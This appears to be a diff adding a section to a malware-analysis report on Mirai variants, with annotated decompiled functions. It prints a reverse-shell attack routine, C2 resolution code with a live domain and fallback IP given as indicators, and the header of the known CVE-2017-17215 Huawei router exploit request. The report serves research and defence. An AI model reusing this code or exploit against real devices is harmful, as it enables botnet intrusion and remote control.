@@ -129,7 +129,8 @@ anti-analysis, C2 resolution, attack modules, exploit scanner).
 
 ### Step 7 — draw it
 
-Sankey of wave → role, plus the reach table in §5.
+Sankey of wave → role, plus the reach table in §5. Then one `function/code`
+call per role for the annotated snippets in §7.
 
 ### Two dead ends worth recording
 
@@ -251,7 +252,155 @@ Stated plainly, because an automated view would inherit all of it:
   functions. They are in the denominator of nothing here, but they are why
   "80 reachable" is the honest population size.
 
-## 7. What would make this a five-minute job
+## 7. What each module type actually is
+
+> **Pivot** — `function/code?id=<function_id>`, one call per function. All but the
+> last come from **`nuclear.arm7`**, a single binary that carries seven of the
+> eight roles; the exploit scanner exists only in `mipsel`.
+
+### Config table — `table_lock_val`
+
+Mirai keeps its strings (C2 host, process names to kill, attack keywords)
+XOR-encrypted in a table and decrypts an entry only for the moment it is used.
+This is why a `strings` dump of a Mirai sample comes back nearly empty.
+
+```c
+void table_lock_val(int idx) {
+    // four-byte rolling XOR against table_key, in place
+    *p = (byte) table_key        ^ *p;
+    *p = (byte)(table_key >>  8) ^ *p;
+    *p = (byte)(table_key >> 16) ^ *p;
+    *p = (byte)(table_key >> 24) ^ *p;
+}
+```
+
+### RNG — `rand_next`
+
+A four-word xorshift. It picks scan targets, source ports and payload padding —
+not cryptography. Ten BSim features, and the most conserved routine in the
+corpus (77 of 80 reachable samples).
+
+```c
+void rand_next(void) {
+    uint t = x ^ x << 0xb;
+    x = y; y = z; z = w;
+    w = w ^ w >> 0x13 ^ t ^ t >> 8;
+}
+```
+
+### Checksums — `checksum_generic`
+
+The bot builds raw IP/TCP/UDP packets itself, so it needs its own one's-complement
+checksum. Its presence is a reliable marker that a sample has a raw-socket flood
+layer at all.
+
+```c
+uint checksum_generic(ushort *addr, uint len) {
+    uint sum = 0;
+    while (len > 1) { sum += *addr++; len -= 2; }
+    if (len == 1) sum += (byte)*addr;
+    sum = (sum & 0xffff) + (sum >> 16);
+    return ~(sum + (sum >> 16)) & 0xffff;
+}
+```
+
+### String / util runtime — `util_memsearch`
+
+Mirai ships its own string functions instead of calling libc. `util_memsearch`
+finds a needle in a socket buffer — used to spot login prompts while scanning and
+to frame C2 messages.
+
+```c
+int util_memsearch(char *buf, int buflen, char *needle, int nlen) {
+    for (i = 0, matched = 0; i < buflen; i++) {
+        if (buf[i] == needle[matched]) {
+            if (++matched == nlen) return i + 1;   // end offset
+        } else matched = 0;
+    }
+    return -1;
+}
+```
+
+### Killer / anti-analysis — `killer_kill`, `anti_gdb_entry`
+
+`killer_kill` reaps the process that hunts competing malware and telnet/SSH
+daemons on the host. `anti_gdb_entry` is Mirai's signature trick: it does nothing
+but install the real resolver into a function pointer, so a debugger breaking at
+entry never sees the C2 resolution happen.
+
+```c
+void killer_kill(void)     { if (killer_pid != 0) kill(killer_pid, 9); }
+void anti_gdb_entry(void)  { resolve_func = resolve_cnc_addr; }
+```
+
+### C2 resolution — `resolve_cnc_addr`
+
+Unlike the Kaiten family, whose C2 list sits in `.data` and is unreachable
+through the API ([companion report](mirai7_kaiten_timeline.md) §6), this build
+puts the C2 in the decompilation as a literal:
+
+```c
+void resolve_cnc_addr(void) {
+    r = resolv_lookup("raw.flameblox.com");      // C2 domain
+    if (r == 0 || r->addr_count < 1)
+        srv_addr.sin_addr = 0x20bf7857;          // fallback
+    else
+        srv_addr.sin_addr = r->addrs[rand_next() % r->addr_count];
+    srv_addr.sin_port   = 0x6514;
+    srv_addr.sin_family = 2;
+}
+```
+
+**New IOCs, not previously recorded in this collection's metadata** (`cc_ip` is
+empty for both files):
+
+| Sample | C2 |
+|---|---|
+| `nuclear.arm7` | `raw.flameblox.com`, fallback `87.120.191.32`, port `5221` |
+| `arm7` | `94.26.106.197` (IP literal, no domain) |
+
+Both constants are read as stored on a little-endian build: `0x20bf7857` →
+`87.120.191.32`, `0x6514` → port `5221`. Worth confirming against a big-endian
+sibling before publishing them anywhere load-bearing.
+
+### Attack modules — `attack_tcp_reverse`
+
+The layer the forks fight over — 21 of 54 capabilities, only 20 % reach. Most are
+packet floods; this one is a reverse shell, handing the operator an interactive
+`/bin/sh` on the device.
+
+```c
+void attack_tcp_reverse(...) {
+    port = attack_get_opt_int(opts, n, 7, 0x115c);
+    for (;;) {
+        fd = socket(2, 1, 0);
+        if (connect(fd, &addr, 16) == -1) { close(fd); sleep(5); continue; }
+        dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
+        execl("/bin/sh", "sh", 0);
+    }
+}
+```
+
+### Exploit scanner — `huawei_scanner_init` (`mipsel` only)
+
+The one capability in the collection that spreads by exploit rather than by
+password guessing: **CVE-2017-17215**, the Huawei HG532 UPnP command injection.
+One sample out of 164.
+
+```
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Host: 127.0.0.1:37215
+Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway",
+    nonce="88645cefb1f9ede0e336e3569d75ee30",
+    response="3612b183a60bac282f588c8180ea262d", algorithm="MD5"
+<?xml version="1.0" ?><s:Envelope ...
+  urn:schemas-upnp-org:service:WANPPPConnection:1
+```
+
+The hard-coded digest credentials and port 37215 are the published signature of
+that CVE, so this is a copy of the well-known exploit, not a new one.
+
+## 8. What would make this a five-minute job
 
 Every step above is mechanical apart from the role buckets in §6 of the method.
 Three things would remove most of the cost — all raised in
@@ -273,7 +422,7 @@ With those three, the analysis in this report is a single view: pick a
 collection, get capabilities on a time axis, click a flow to see the functions
 and the samples behind it.
 
-## 8. Conclusions
+## 9. Conclusions
 
 1. **The Mirai side of `mirai7` is not one lineage.** It is a shared core with at
    least four independently-named forks on top, and at least two of those
